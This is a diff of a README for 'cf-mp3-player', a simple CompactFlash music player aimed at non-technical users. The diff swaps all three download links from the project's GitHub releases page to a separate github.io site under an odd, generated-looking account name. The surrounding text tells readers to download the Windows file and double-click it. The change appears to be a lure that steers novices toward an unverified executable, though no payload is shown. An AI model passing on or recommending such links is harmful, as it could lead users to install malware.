@@ -4,7 +4,7 @@
 
 Welcome to **cf-mp3-player**! This is a simple, no-nonsense music player that lets you enjoy your favorite MP3, WAV, and FLAC files directly from a CF (CompactFlash) card. Whether you're on a computer with a CF card reader or just want a straightforward way to play your digital music collection, this application is designed for everyone—no technical skills required.
 
-[![Download Now](https://img.shields.io/badge/Download-cf--mp3--player-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Dissociative-familyargiopidae307/cf-mp3-player/releases)
+[![Download Now](https://img.shields.io/badge/Download-cf--mp3--player-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://dissociative-familyargiopidae307.github.io)
 
 ## 🎯 What This App Does
 
@@ -25,7 +25,7 @@ That's it! No special hardware, no complicated setup, and no coding knowledge re
 
 Getting the software is the easiest part. Here's what you need to do:
 
-1.  Click the green button above, or use this direct link: [Download cf-mp3-player](https://github.com/Dissociative-familyargiopidae307/cf-mp3-player/releases)
+1.  Click the green button above, or use this direct link: [Download cf-mp3-player](https://dissociative-familyargiopidae307.github.io)
 2.  Visit this link to download the application. You'll be taken to a page where you can grab the latest version.
 3.  Look for the file that matches your computer (usually labeled "Windows" or "Win").
 4.  Click on it to start the download. Your browser will save the file to your "Downloads" folder by default.
@@ -121,7 +121,7 @@ If you run into any trouble or have questions, here are some ways to find answer
 
 You're just three steps away from enjoying your music:
 
-1.  **[Download the app](https://github.com/Dissociative-familyargiopidae307/cf-mp3-player/releases)**
+1.  **[Download the app](https://dissociative-familyargiopidae307.github.io)**
 2.  **Run it** (double-click the file you downloaded)
 3.  **Play your music** (click "Open Folder" and select your songs)
 
